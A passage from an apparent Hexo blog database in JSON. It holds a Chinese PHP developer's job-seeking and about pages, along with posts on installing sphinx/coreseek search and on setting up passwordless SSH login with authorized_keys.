cc26279c04046632e22d872f111bc9399","modified":1520249856735},{"_id":"themes/cactus-white/source/lib/meslo-LG/fonts/MesloLGL-Bold.ttf","hash":"bfa1ed9a263ed78462f06d322de13bd5bd0906b2","modified":1520249856698},{"_id":"themes/cactus-white/source/lib/meslo-LG/fonts/MesloLGL-BoldItalic.ttf","hash":"a9a431fc7a6c3a67c98021d4035c12a07a4f1070","modified":1520249856702},{"_id":"themes/cactus-white/source/lib/meslo-LG/fonts/MesloLGL-Regular.ttf","hash":"2b912dd13f052f645ee19951604610bb350d50af","modified":1520249856713},{"_id":"themes/cactus-white/source/lib/meslo-LG/fonts/MesloLGM-Bold.ttf","hash":"a8a8df3393bccc365335fc5eb0a62a6b7ccd32b9","modified":1520249856715},{"_id":"themes/cactus-white/source/lib/meslo-LG/fonts/MesloLGM-BoldItalic.ttf","hash":"65ddb11e75ee93909e845ab912a36717c48f1c94","modified":1520249856720},{"_id":"themes/cactus-white/source/lib/meslo-LG/fonts/MesloLGS-Bold.ttf","hash":"df202ce09cbdc70bc16b81983a13ef0f94e46f10","modified":1520249856731},{"_id":"themes/cactus-white/source/lib/meslo-LG/fonts/MesloLGM-Regular.ttf","hash":"5e220152adefe905b2197f873d7cee99eca50e91","modified":1520249856728},{"_id":"themes/cactus-white/source/lib/meslo-LG/fonts/MesloLGS-BoldItalic.ttf","hash":"d895a1bd25e36c58b7f463ebe14de09f186d5ab4","modified":1520249856733},{"_id":"themes/cactus-white/source/lib/meslo-LG/fonts/MesloLGS-Regular.ttf","hash":"56fa0e33a390b704afc56af93a31576ccdbbdd9e","modified":1520249856737},{"_id":"themes/cactus-white/source/images/theme overview.psd","hash":"8dc11d9d289c247423911e962c4eb3a556dc67d1","modified":1520249856672},{"_id":"themes/cactus-white/.git/objects/pack/pack-6f8fbec58a204e048ab698845ccfd6a27ff53f58.pack","hash":"071d6682707ba4c7601e615077de1e355c9c2f92","modified":1520249856573},{"_id":"themes/cactus-white/source/favicon.ico","hash":"6c5ac4d3ba5de094ae048b1b6fce99307302e73b","modified":1520251120630}],"Category":[{"name":"未分类","_id":"cjee59kom000bgmlmbtxmpvc6"},{"name":"linux","_id":"cjee59kr8001fgmlm0wk61nux"},{"name":"sphinx","_id":"cjee59krz002bgmlmqgy6mc2m"},{"name":"前端","_id":"cjee59ksb002pgmlm38z2pbkn"},{"name":"骑行","_id":"cjee59ksr003cgmlmpg3kzllq"},{"name":"经历","_id":"cjee59kt1003sgmlmlcgtflnf"},{"name":"php","_id":"cjee59ktd004cgmlmjhhdd5rg"},{"name":"Android","_id":"cjee59kwd008jgmlm3nj99g29"},{"name":"php","parent":"cjee59kr8001fgmlm0wk61nux","_id":"cjee59kwu0098gmlmiimzivnt"}],"Data":[],"Page":[{"title":"找工作","id":239,"comment":false,"date":"2015-12-10T04:21:42.000Z","_content":"\n我从事PHP方面的工作3年多了，对PHP可以说是烂熟。此外对linux运维，web前端等也很熟悉。\n\n### 我现在的状况\n\n我现在在北京一家创业公司工作，入职快两个月了（2015-10-26入职）。但是在做了段项目后，发现公司的技术氛围很一般，对产品缺少热爱。所以我想离职，但纠结于年底能否找到合适的工作。\n\n### 如果你有这样一份工作\n\n*   技术氛围浓厚\n*   对学历没限制（我没读大学）\n*   能把产品做到极致\n*   最好在北京\n\n### 我有这些技能\n\n*   做过日活数十万的项目，了解性能优化点\n*   对redis的特性很了解\n*   PHP代码符合PSR标准\n*   精通Yii1,Yii2框架\n*   做过大小项目超过二十个\n*   对薪资要求很随意（10K-20K）\n*   擅长并且也喜欢前端的工作\n\n### 我理想的公司\n\n*   蚂蜂窝\n*   美团网\n*   能做出精美产品的公司\n\n如果想详细了解，可以邮件联系我：joaner1206@gmail.com。","source":"e6-89-be-e5-b7-a5-e4-bd-9c/index.md","raw":"---\ntitle: 找工作\nid: 239\ncomment: false\ndate: 2015-12-10 12:21:42\n---\n\n我从事PHP方面的工作3年多了，对PHP可以说是烂熟。此外对linux运维，web前端等也很熟悉。\n\n### 我现在的状况\n\n我现在在北京一家创业公司工作，入职快两个月了（2015-10-26入职）。但是在做了段项目后，发现公司的技术氛围很一般，对产品缺少热爱。所以我想离职，但纠结于年底能否找到合适的工作。\n\n### 如果你有这样一份工作\n\n*   技术氛围浓厚\n*   对学历没限制（我没读大学）\n*   能把产品做到极致\n*   最好在北京\n\n### 我有这些技能\n\n*   做过日活数十万的项目，了解性能优化点\n*   对redis的特性很了解\n*   PHP代码符合PSR标准\n*   精通Yii1,Yii2框架\n*   做过大小项目超过二十个\n*   对薪资要求很随意（10K-20K）\n*   擅长并且也喜欢前端的工作\n\n### 我理想的公司\n\n*   蚂蜂窝\n*   美团网\n*   能做出精美产品的公司\n\n如果想详细了解，可以邮件联系我：joaner1206@gmail.com。","updated":"2018-03-05T11:32:58.733Z","path":"e6-89-be-e5-b7-a5-e4-bd-9c/index.html","_id":"cjee5cijz00fagmlmw4zzt57l","comments":1,"layout":"page","content":"<p>我从事PHP方面的工作3年多了，对PHP可以说是烂熟。此外对linux运维，web前端等也很熟悉。</p>\n<h3 id=\"我现在的状况\"><a href=\"#我现在的状况\" class=\"headerlink\" title=\"我现在的状况\"></a>我现在的状况</h3><p>我现在在北京一家创业公司工作，入职快两个月了（2015-10-26入职）。但是在做了段项目后，发现公司的技术氛围很一般，对产品缺少热爱。所以我想离职，但纠结于年底能否找到合适的工作。</p>\n<h3 id=\"如果你有这样一份工作\"><a href=\"#如果你有这样一份工作\" class=\"headerlink\" title=\"如果你有这样一份工作\"></a>如果你有这样一份工作</h3><ul>\n<li>技术氛围浓厚</li>\n<li>对学历没限制（我没读大学）</li>\n<li>能把产品做到极致</li>\n<li>最好在北京</li>\n</ul>\n<h3 id=\"我有这些技能\"><a href=\"#我有这些技能\" class=\"headerlink\" title=\"我有这些技能\"></a>我有这些技能</h3><ul>\n<li>做过日活数十万的项目，了解性能优化点</li>\n<li>对redis的特性很了解</li>\n<li>PHP代码符合PSR标准</li>\n<li>精通Yii1,Yii2框架</li>\n<li>做过大小项目超过二十个</li>\n<li>对薪资要求很随意（10K-20K）</li>\n<li>擅长并且也喜欢前端的工作</li>\n</ul>\n<h3 id=\"我理想的公司\"><a href=\"#我理想的公司\" class=\"headerlink\" title=\"我理想的公司\"></a>我理想的公司</h3><ul>\n<li>蚂蜂窝</li>\n<li>美团网</li>\n<li>能做出精美产品的公司</li>\n</ul>\n<p>如果想详细了解，可以邮件联系我：<a href=\"mailto:joaner1206@gmail.com\" target=\"_blank\" rel=\"noopener\">joaner1206@gmail.com</a>。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>我从事PHP方面的工作3年多了，对PHP可以说是烂熟。此外对linux运维，web前端等也很熟悉。</p>\n<h3 id=\"我现在的状况\"><a href=\"#我现在的状况\" class=\"headerlink\" title=\"我现在的状况\"></a>我现在的状况</h3><p>我现在在北京一家创业公司工作，入职快两个月了（2015-10-26入职）。但是在做了段项目后，发现公司的技术氛围很一般，对产品缺少热爱。所以我想离职，但纠结于年底能否找到合适的工作。</p>\n<h3 id=\"如果你有这样一份工作\"><a href=\"#如果你有这样一份工作\" class=\"headerlink\" title=\"如果你有这样一份工作\"></a>如果你有这样一份工作</h3><ul>\n<li>技术氛围浓厚</li>\n<li>对学历没限制（我没读大学）</li>\n<li>能把产品做到极致</li>\n<li>最好在北京</li>\n</ul>\n<h3 id=\"我有这些技能\"><a href=\"#我有这些技能\" class=\"headerlink\" title=\"我有这些技能\"></a>我有这些技能</h3><ul>\n<li>做过日活数十万的项目，了解性能优化点</li>\n<li>对redis的特性很了解</li>\n<li>PHP代码符合PSR标准</li>\n<li>精通Yii1,Yii2框架</li>\n<li>做过大小项目超过二十个</li>\n<li>对薪资要求很随意（10K-20K）</li>\n<li>擅长并且也喜欢前端的工作</li>\n</ul>\n<h3 id=\"我理想的公司\"><a href=\"#我理想的公司\" class=\"headerlink\" title=\"我理想的公司\"></a>我理想的公司</h3><ul>\n<li>蚂蜂窝</li>\n<li>美团网</li>\n<li>能做出精美产品的公司</li>\n</ul>\n<p>如果想详细了解，可以邮件联系我：<a href=\"mailto:joaner1206@gmail.com\" target=\"_blank\" rel=\"noopener\">joaner1206@gmail.com</a>。</p>\n"},{"title":"关于我","id":9,"date":"2014-03-28T13:11:03.000Z","_content":"\n我的ID一般是joaner，xiaoai.me是我的博客，用来记录我的生活历程。\n\n这个博客我断断续续写了两年多，中间折腾过许多VPS，丢过几次数据。现在博客搭建在Google台湾数据中心（GCE,Asia），速度很不错，国内下载速度甚至能到500K以上。\n\ngithub: https://github.com/joaner","source":"e5-85-b3-e4-ba-8e-e6-88-91/index.md","raw":"---\ntitle: 关于我\nid: 9\ndate: 2014-03-28 21:11:03\n---\n\n我的ID一般是joaner，xiaoai.me是我的博客，用来记录我的生活历程。\n\n这个博客我断断续续写了两年多，中间折腾过许多VPS，丢过几次数据。现在博客搭建在Google台湾数据中心（GCE,Asia），速度很不错，国内下载速度甚至能到500K以上。\n\ngithub: https://github.com/joaner","updated":"2018-03-05T11:32:58.733Z","path":"e5-85-b3-e4-ba-8e-e6-88-91/index.html","_id":"cjee5cik300fcgmlmwcjjugy7","comments":1,"layout":"page","content":"<p>我的ID一般是joaner，xiaoai.me是我的博客，用来记录我的生活历程。</p>\n<p>这个博客我断断续续写了两年多，中间折腾过许多VPS，丢过几次数据。现在博客搭建在Google台湾数据中心（GCE,Asia），速度很不错，国内下载速度甚至能到500K以上。</p>\n<p>github: <a href=\"https://github.com/joaner\" target=\"_blank\" rel=\"noopener\">https://github.com/joaner</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>我的ID一般是joaner，xiaoai.me是我的博客，用来记录我的生活历程。</p>\n<p>这个博客我断断续续写了两年多，中间折腾过许多VPS，丢过几次数据。现在博客搭建在Google台湾数据中心（GCE,Asia），速度很不错，国内下载速度甚至能到500K以上。</p>\n<p>github: <a href=\"https://github.com/joaner\" target=\"_blank\" rel=\"noopener\">https://github.com/joaner</a></p>\n"}],"Post":[{"title":"sphinx 安装记录","id":"15","date":"2014-06-23T10:34:44.000Z","_content":"\n1\\. yum 安装\n<pre class=\"lang:sh decode:true \">$ sudo yum install sphinx libsphinxclient libsphinxclient-devel</pre>\n&nbsp;","source":"_posts/sphinx-e5-ae-89-e8-a3-85-e8-ae-b0-e5-bd-95.md","raw":"---\ntitle: sphinx 安装记录\nid: 15\ncategories:\n  - sphinx\ndate: 2014-06-23 18:34:44\ntags:\n---\n\n1\\. yum 安装\n<pre class=\"lang:sh decode:true \">$ sudo yum install sphinx libsphinxclient libsphinxclient-devel</pre>\n&nbsp;","slug":"sphinx-e5-ae-89-e8-a3-85-e8-ae-b0-e5-bd-95","published":1,"updated":"2018-03-05T11:32:58.726Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cik100fbgmlmaidc6jrh","content":"<p>1. yum 安装</p>\n<p><pre class=\"lang:sh decode:true \">$ sudo yum install sphinx libsphinxclient libsphinxclient-devel</pre><br>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>1. yum 安装</p>\n<p><pre class=\"lang:sh decode:true \">$ sudo yum install sphinx libsphinxclient libsphinxclient-devel</pre><br>&nbsp;</p>\n"},{"title":"ubuntu安装coreseek4.1","id":"27","date":"2014-07-11T08:36:10.000Z","_content":"\n目录规划：\n\n此过程将编译两个包， mmseg-3.2.14 和 coreseek-4.1，它们都将包含版本号放置在 /server 下\n\n索引和日志放在 /alidata/coreseek/ 下\n\n&nbsp;\n\n下载源码包，包里集成了coreseek4.1 mmseg3.1.4\n<pre class=\"lang:sh decode:true\">wget http://www.coreseek.cn/uploads/csft/4.0/coreseek-4.1-beta.tar.gz</pre>\n&nbsp;\n\n安装libtool (coreseek需要)\n<pre class=\"lang:sh decode:true \">apt-get install libtool</pre>\n&nbsp;\n\n实际安装: libltdl-dev libltdl7 libtool\n\n安装mysql开发者包\n<pre class=\"lang:default decode:true \">sudo apt-get install mysql-devel</pre>\n&nbsp;\n\n实际安装: libmysqlclient-dev libmysqlclient18 libmysqld-dev mysql-common\n\n&nbsp;\n\n安装 mmseg  (源码集成在 coreseek-4.1-beta)\n<pre class=\"lang:sh decode:true \">cd  mmseg-3.2.14/\n\n# 包内自带的编译前初始化工具\n\n./bootstrap \n\n# 安装到 /server/mmseg-3.2.14\n\n./configure --prefix=/server/mmseg-3.2.14\n\nmake &amp;&amp; make install</pre>\n&nbsp;\n\n安装 coreseek\n<pre class=\"lang:sh decode:true\"># 包内自带的编译前初始化工具\n./buildconf.sh\n./configure --prefix=/server/coreseek-4.1 --with-mysql --with-mmseg --with-mysql-includes=/usr/include/mysql --with-mmseg-includes=/server/mmseg-3.2.14/include/mmseg --with-mmseg-libs=/server/mmseg-3.2.14/lib\nmake &amp;&amp; make install</pre>\n-------------------- 安装完成 ---------------\n\n创建索引数据与日志的目录：\n<pre class=\"lang:sh decode:true \">mkdir /alidata/coreseek\nmkdir /alidata/coreseek/index\nmkdir /alidata/coreseek/log</pre>\n&nbsp;\n\n&nbsp;\n\n添加配置文件\n<pre class=\"lang:sh decode:true \"># 从 xueba-tiku 仓库中提取sphinx的配置文件\n\nln -s /home/pxk/www/xueba-tiku/protected/data/sphinx.conf  /server/coreseek-4.1/etc/\n\n# 修改配置 /server/coreseek-4.1/etc/sphinx.conf 中的路径和数据库参数\n\n# 添加词库 （词库在仓库里）\n\n/server/mmseg-3.2.14/bin/mmseg -u /home/pxk/www/xueba-tiku/protected/data/edu.txt\n\n# 添加stopword.txt （忽略词汇）\n\nln -s /home/pxk/www/xueba-tiku/protected/data/stopwords.txt /server/coreseek-4.1/etc/</pre>\n&nbsp;\n\n&nbsp;\n\n--------------------------- 配置完成 ---------------------------\n<pre class=\"lang:sh decode:true \"># 创建索引数据\n\n/server/coreseek-4.1/bin/indexer --config /server/coreseek-4.1/etc/sphinx.conf --all\n\n# 启动搜索服务后台进程\n\n/server/coreseek-4.1/bin/searchd --config /server/coreseek-4.1/etc/sphinx.conf</pre>\n&nbsp;\n\n&nbsp;","source":"_posts/ubuntu-e5-ae-89-e8-a3-85coreseek4-1.md","raw":"---\ntitle: ubuntu安装coreseek4.1\nid: 27\ncategories:\n  - sphinx\ndate: 2014-07-11 16:36:10\ntags:\n---\n\n目录规划：\n\n此过程将编译两个包， mmseg-3.2.14 和 coreseek-4.1，它们都将包含版本号放置在 /server 下\n\n索引和日志放在 /alidata/coreseek/ 下\n\n&nbsp;\n\n下载源码包，包里集成了coreseek4.1 mmseg3.1.4\n<pre class=\"lang:sh decode:true\">wget http://www.coreseek.cn/uploads/csft/4.0/coreseek-4.1-beta.tar.gz</pre>\n&nbsp;\n\n安装libtool (coreseek需要)\n<pre class=\"lang:sh decode:true \">apt-get install libtool</pre>\n&nbsp;\n\n实际安装: libltdl-dev libltdl7 libtool\n\n安装mysql开发者包\n<pre class=\"lang:default decode:true \">sudo apt-get install mysql-devel</pre>\n&nbsp;\n\n实际安装: libmysqlclient-dev libmysqlclient18 libmysqld-dev mysql-common\n\n&nbsp;\n\n安装 mmseg  (源码集成在 coreseek-4.1-beta)\n<pre class=\"lang:sh decode:true \">cd  mmseg-3.2.14/\n\n# 包内自带的编译前初始化工具\n\n./bootstrap \n\n# 安装到 /server/mmseg-3.2.14\n\n./configure --prefix=/server/mmseg-3.2.14\n\nmake &amp;&amp; make install</pre>\n&nbsp;\n\n安装 coreseek\n<pre class=\"lang:sh decode:true\"># 包内自带的编译前初始化工具\n./buildconf.sh\n./configure --prefix=/server/coreseek-4.1 --with-mysql --with-mmseg --with-mysql-includes=/usr/include/mysql --with-mmseg-includes=/server/mmseg-3.2.14/include/mmseg --with-mmseg-libs=/server/mmseg-3.2.14/lib\nmake &amp;&amp; make install</pre>\n-------------------- 安装完成 ---------------\n\n创建索引数据与日志的目录：\n<pre class=\"lang:sh decode:true \">mkdir /alidata/coreseek\nmkdir /alidata/coreseek/index\nmkdir /alidata/coreseek/log</pre>\n&nbsp;\n\n&nbsp;\n\n添加配置文件\n<pre class=\"lang:sh decode:true \"># 从 xueba-tiku 仓库中提取sphinx的配置文件\n\nln -s /home/pxk/www/xueba-tiku/protected/data/sphinx.conf  /server/coreseek-4.1/etc/\n\n# 修改配置 /server/coreseek-4.1/etc/sphinx.conf 中的路径和数据库参数\n\n# 添加词库 （词库在仓库里）\n\n/server/mmseg-3.2.14/bin/mmseg -u /home/pxk/www/xueba-tiku/protected/data/edu.txt\n\n# 添加stopword.txt （忽略词汇）\n\nln -s /home/pxk/www/xueba-tiku/protected/data/stopwords.txt /server/coreseek-4.1/etc/</pre>\n&nbsp;\n\n&nbsp;\n\n--------------------------- 配置完成 ---------------------------\n<pre class=\"lang:sh decode:true \"># 创建索引数据\n\n/server/coreseek-4.1/bin/indexer --config /server/coreseek-4.1/etc/sphinx.conf --all\n\n# 启动搜索服务后台进程\n\n/server/coreseek-4.1/bin/searchd --config /server/coreseek-4.1/etc/sphinx.conf</pre>\n&nbsp;\n\n&nbsp;","slug":"ubuntu-e5-ae-89-e8-a3-85coreseek4-1","published":1,"updated":"2018-03-05T11:32:58.726Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cik500fdgmlmieabywno","content":"<p>目录规划：</p>\n<p>此过程将编译两个包， mmseg-3.2.14 和 coreseek-4.1，它们都将包含版本号放置在 /server 下</p>\n<p>索引和日志放在 /alidata/coreseek/ 下</p>\n<p>&nbsp;</p>\n<p>下载源码包，包里集成了coreseek4.1 mmseg3.1.4</p>\n<p><pre class=\"lang:sh decode:true\">wget <a href=\"http://www.coreseek.cn/uploads/csft/4.0/coreseek-4.1-beta.tar.gz\" target=\"_blank\" rel=\"noopener\">http://www.coreseek.cn/uploads/csft/4.0/coreseek-4.1-beta.tar.gz</a></pre><br>&nbsp;</p>\n<p>安装libtool (coreseek需要)</p>\n<p><pre class=\"lang:sh decode:true \">apt-get install libtool</pre><br>&nbsp;</p>\n<p>实际安装: libltdl-dev libltdl7 libtool</p>\n<p>安装mysql开发者包</p>\n<p><pre class=\"lang:default decode:true \">sudo apt-get install mysql-devel</pre><br>&nbsp;</p>\n<p>实际安装: libmysqlclient-dev libmysqlclient18 libmysqld-dev mysql-common</p>\n<p>&nbsp;</p>\n<p>安装 mmseg  (源码集成在 coreseek-4.1-beta)</p>\n<p><pre class=\"lang:sh decode:true \">cd  mmseg-3.2.14/</pre></p>\n<h1 id=\"包内自带的编译前初始化工具\"><a href=\"#包内自带的编译前初始化工具\" class=\"headerlink\" title=\"包内自带的编译前初始化工具\"></a>包内自带的编译前初始化工具</h1><p>./bootstrap </p>\n<h1 id=\"安装到-server-mmseg-3-2-14\"><a href=\"#安装到-server-mmseg-3-2-14\" class=\"headerlink\" title=\"安装到 /server/mmseg-3.2.14\"></a>安装到 /server/mmseg-3.2.14</h1><p>./configure –prefix=/server/mmseg-3.2.14</p>\n<p>make &amp;&amp; make install<br>&nbsp;</p>\n<p>安装 coreseek</p>\n<p><pre class=\"lang:sh decode:true\"># 包内自带的编译前初始化工具<br>./buildconf.sh<br>./configure –prefix=/server/coreseek-4.1 –with-mysql –with-mmseg –with-mysql-includes=/usr/include/mysql –with-mmseg-includes=/server/mmseg-3.2.14/include/mmseg –with-mmseg-libs=/server/mmseg-3.2.14/lib<br>make &amp;&amp; make install</pre><br>——————– 安装完成 —————</p>\n<p>创建索引数据与日志的目录：</p>\n<p><pre class=\"lang:sh decode:true \">mkdir /alidata/coreseek<br>mkdir /alidata/coreseek/index<br>mkdir /alidata/coreseek/log</pre><br>&nbsp;</p>\n<p>&nbsp;</p>\n<p>添加配置文件</p>\n<p><pre class=\"lang:sh decode:true \"># 从 xueba-tiku 仓库中提取sphinx的配置文件</pre></p>\n<p>ln -s /home/pxk/www/xueba-tiku/protected/data/sphinx.conf  /server/coreseek-4.1/etc/</p>\n<h1 id=\"修改配置-server-coreseek-4-1-etc-sphinx-conf-中的路径和数据库参数\"><a href=\"#修改配置-server-coreseek-4-1-etc-sphinx-conf-中的路径和数据库参数\" class=\"headerlink\" title=\"修改配置 /server/coreseek-4.1/etc/sphinx.conf 中的路径和数据库参数\"></a>修改配置 /server/coreseek-4.1/etc/sphinx.conf 中的路径和数据库参数</h1><h1 id=\"添加词库-（词库在仓库里）\"><a href=\"#添加词库-（词库在仓库里）\" class=\"headerlink\" title=\"添加词库 （词库在仓库里）\"></a>添加词库 （词库在仓库里）</h1><p>/server/mmseg-3.2.14/bin/mmseg -u /home/pxk/www/xueba-tiku/protected/data/edu.txt</p>\n<h1 id=\"添加stopword-txt-（忽略词汇）\"><a href=\"#添加stopword-txt-（忽略词汇）\" class=\"headerlink\" title=\"添加stopword.txt （忽略词汇）\"></a>添加stopword.txt （忽略词汇）</h1><p>ln -s /home/pxk/www/xueba-tiku/protected/data/stopwords.txt /server/coreseek-4.1/etc/<br>&nbsp;</p>\n<p>&nbsp;</p>\n<p>————————— 配置完成 —————————</p>\n<p><pre class=\"lang:sh decode:true \"># 创建索引数据</pre></p>\n<p>/server/coreseek-4.1/bin/indexer –config /server/coreseek-4.1/etc/sphinx.conf –all</p>\n<h1 id=\"启动搜索服务后台进程\"><a href=\"#启动搜索服务后台进程\" class=\"headerlink\" title=\"启动搜索服务后台进程\"></a>启动搜索服务后台进程</h1><p>/server/coreseek-4.1/bin/searchd –config /server/coreseek-4.1/etc/sphinx.conf<br>&nbsp;</p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>目录规划：</p>\n<p>此过程将编译两个包， mmseg-3.2.14 和 coreseek-4.1，它们都将包含版本号放置在 /server 下</p>\n<p>索引和日志放在 /alidata/coreseek/ 下</p>\n<p>&nbsp;</p>\n<p>下载源码包，包里集成了coreseek4.1 mmseg3.1.4</p>\n<p><pre class=\"lang:sh decode:true\">wget <a href=\"http://www.coreseek.cn/uploads/csft/4.0/coreseek-4.1-beta.tar.gz\" target=\"_blank\" rel=\"noopener\">http://www.coreseek.cn/uploads/csft/4.0/coreseek-4.1-beta.tar.gz</a></pre><br>&nbsp;</p>\n<p>安装libtool (coreseek需要)</p>\n<p><pre class=\"lang:sh decode:true \">apt-get install libtool</pre><br>&nbsp;</p>\n<p>实际安装: libltdl-dev libltdl7 libtool</p>\n<p>安装mysql开发者包</p>\n<p><pre class=\"lang:default decode:true \">sudo apt-get install mysql-devel</pre><br>&nbsp;</p>\n<p>实际安装: libmysqlclient-dev libmysqlclient18 libmysqld-dev mysql-common</p>\n<p>&nbsp;</p>\n<p>安装 mmseg  (源码集成在 coreseek-4.1-beta)</p>\n<p><pre class=\"lang:sh decode:true \">cd  mmseg-3.2.14/</pre></p>\n<h1 id=\"包内自带的编译前初始化工具\"><a href=\"#包内自带的编译前初始化工具\" class=\"headerlink\" title=\"包内自带的编译前初始化工具\"></a>包内自带的编译前初始化工具</h1><p>./bootstrap </p>\n<h1 id=\"安装到-server-mmseg-3-2-14\"><a href=\"#安装到-server-mmseg-3-2-14\" class=\"headerlink\" title=\"安装到 /server/mmseg-3.2.14\"></a>安装到 /server/mmseg-3.2.14</h1><p>./configure –prefix=/server/mmseg-3.2.14</p>\n<p>make &amp;&amp; make install<br>&nbsp;</p>\n<p>安装 coreseek</p>\n<p><pre class=\"lang:sh decode:true\"># 包内自带的编译前初始化工具<br>./buildconf.sh<br>./configure –prefix=/server/coreseek-4.1 –with-mysql –with-mmseg –with-mysql-includes=/usr/include/mysql –with-mmseg-includes=/server/mmseg-3.2.14/include/mmseg –with-mmseg-libs=/server/mmseg-3.2.14/lib<br>make &amp;&amp; make install</pre><br>——————– 安装完成 —————</p>\n<p>创建索引数据与日志的目录：</p>\n<p><pre class=\"lang:sh decode:true \">mkdir /alidata/coreseek<br>mkdir /alidata/coreseek/index<br>mkdir /alidata/coreseek/log</pre><br>&nbsp;</p>\n<p>&nbsp;</p>\n<p>添加配置文件</p>\n<p><pre class=\"lang:sh decode:true \"># 从 xueba-tiku 仓库中提取sphinx的配置文件</pre></p>\n<p>ln -s /home/pxk/www/xueba-tiku/protected/data/sphinx.conf  /server/coreseek-4.1/etc/</p>\n<h1 id=\"修改配置-server-coreseek-4-1-etc-sphinx-conf-中的路径和数据库参数\"><a href=\"#修改配置-server-coreseek-4-1-etc-sphinx-conf-中的路径和数据库参数\" class=\"headerlink\" title=\"修改配置 /server/coreseek-4.1/etc/sphinx.conf 中的路径和数据库参数\"></a>修改配置 /server/coreseek-4.1/etc/sphinx.conf 中的路径和数据库参数</h1><h1 id=\"添加词库-（词库在仓库里）\"><a href=\"#添加词库-（词库在仓库里）\" class=\"headerlink\" title=\"添加词库 （词库在仓库里）\"></a>添加词库 （词库在仓库里）</h1><p>/server/mmseg-3.2.14/bin/mmseg -u /home/pxk/www/xueba-tiku/protected/data/edu.txt</p>\n<h1 id=\"添加stopword-txt-（忽略词汇）\"><a href=\"#添加stopword-txt-（忽略词汇）\" class=\"headerlink\" title=\"添加stopword.txt （忽略词汇）\"></a>添加stopword.txt （忽略词汇）</h1><p>ln -s /home/pxk/www/xueba-tiku/protected/data/stopwords.txt /server/coreseek-4.1/etc/<br>&nbsp;</p>\n<p>&nbsp;</p>\n<p>————————— 配置完成 —————————</p>\n<p><pre class=\"lang:sh decode:true \"># 创建索引数据</pre></p>\n<p>/server/coreseek-4.1/bin/indexer –config /server/coreseek-4.1/etc/sphinx.conf –all</p>\n<h1 id=\"启动搜索服务后台进程\"><a href=\"#启动搜索服务后台进程\" class=\"headerlink\" title=\"启动搜索服务后台进程\"></a>启动搜索服务后台进程</h1><p>/server/coreseek-4.1/bin/searchd –config /server/coreseek-4.1/etc/sphinx.conf<br>&nbsp;</p>\n<p>&nbsp;</p>\n"},{"title":"SSH 免登陆 authorized_keys","id":"33","date":"2015-05-08T21:28:26.000Z","_content":"\n### authorized_keys\n\n这是通用的做法，将本地机器的 `id_rsa.pub` 公匙字符串拷贝下来，追加到服务器的 `~/.ssh/authorized_keys` 文件下，作为一行,并且保持其它人不可写的权限,就可以不用再输入密码．\n\n#### 客户端的配置\n\n##### linux\n\n创建客户端ssh key,回车选默认的即可\n创建程序会询问你的key存放位置,以及加密密码等,回车选则默认即可\n<pre>$ ssh-keygen\n</pre>\n打印认证公匙,复制然后开始下一步\n<pre>$ cat ~/.ssh/id_rsa.pub\n</pre>\n公匙 ~/.ssh/id_rsa.pub 是每次登录ssh时都会发送的,因而把其加入到服务器的 ~/.ssh/authorized_keys 后,服务器会据此判断是否可以免除密码认证过程\n\n&nbsp;\n\n#### 服务端的配置\n\n创建自动认证文件,如果没有的话\n<pre>$ touch ~/.ssh/authorized_keys</pre>\n设置该文件权限为其它人不可写,权限限制是必须的,否则将不会生效\n<pre>$ chmod 644 ~/.ssh/authorized_keys</pre>\n将在客户端拷贝的 ~/.ssh/id_rsa.pub 内容追加到认证文件,它只占一行\n<pre>$ vi ~/.ssh/authorized_keys</pre>","source":"_posts/ssh-e5-85-8d-e7-99-bb-e9-99-86-authorized-keys.md","raw":"---\ntitle: SSH 免登陆 authorized_keys\nid: 33\ncategories:\n  - linux\ndate: 2015-05-09 05:28:26\ntags:\n---\n\n### authorized_keys\n\n这是通用的做法，将本地机器的 `id_rsa.pub` 公匙字符串拷贝下来，追加到服务器的 `~/.ssh/authorized_keys` 文件下，作为一行,并且保持其它人不可写的权限,就可以不用再输入密码．\n\n#### 客户端的配置\n\n##### linux\n\n创建客户端ssh key,回车选默认的即可\n创建程序会询问你的key存放位置,以及加密密码等,回车选则默认即可\n<pre>$ ssh-keygen\n</pre>\n打印认证公匙,复制然后开始下一步\n<pre>$ cat ~/.ssh/id_rsa.pub\n</pre>\n公匙 ~/.ssh/id_rsa.pub 是每次登录ssh时都会发送的,因而把其加入到服务器的 ~/.ssh/authorized_keys 后,服务器会据此判断是否可以免除密码认证过程\n\n&nbsp;\n\n#### 服务端的配置\n\n创建自动认证文件,如果没有的话\n<pre>$ touch ~/.ssh/authorized_keys</pre>\n设置该文件权限为其它人不可写,权限限制是必须的,否则将不会生效\n<pre>$ chmod 644 ~/.ssh/authorized_keys</pre>\n将在客户端拷贝的 ~/.ssh/id_rsa.pub 内容追加到认证文件,它只占一行\n<pre>$ vi ~/.ssh/authorized_keys</pre>","slug":"ssh-e5-85-8d-e7-99-bb-e9-99-86-authorized-keys","published":1,"updated":"2018-03-05T11:32:58.726Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cik600fegmlmg7kgwbe2","content":"<h3 id=\"authorized-keys\"><a href=\"#authorized-keys\" class=\"headerlink\" title=\"authorized_keys\"></a>authorized_keys</h3><p>这是通用的做法，将本地机器的 <code>id_rsa.pub</code> 公匙字符串拷贝下来，追加到服务器的 <code>~/.ssh/authorized_keys</code> 文件下，作为一行,并且保持其它人不可写的权限,就可以不用再输入密码．</p>\n<h4 id=\"客户端的配置\"><a href=\"#客户端的配置\" class=\"headerlink\" title=\"客户端的配置\"></a>客户端的配置</h4><h5 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h5><p>创建客户端ssh key,回车选默认的即可<br>创建程序会询问你的key存放位置,以及加密密码等,回车选则默认即可</p>\n<pre>$ ssh-keygen\n</pre>\n打印认证公匙,复制然后开始下一步\n<pre>$ cat ~/.ssh/id_rsa.pub\n</pre>\n公匙 ~/.ssh/id_rsa.pub 是每次登录ssh时都会发送的,因而把其加入到服务器的 ~/.ssh/authorized_keys 后,服务器会据此判断是否可以免除密码认证过程\n\n&nbsp;\n\n#### 服务端的配置\n\n创建自动认证文件,如果没有的话\n<pre>$ touch ~/.ssh/authorized_keys</pre>\n设置该文件权限为其它人不可写,权限限制是必须的,否则将不会生效\n<pre>$ chmod 644 ~/.ssh/authorized_keys</pre>\n将在客户端拷贝的 ~/.ssh/id_rsa.pub 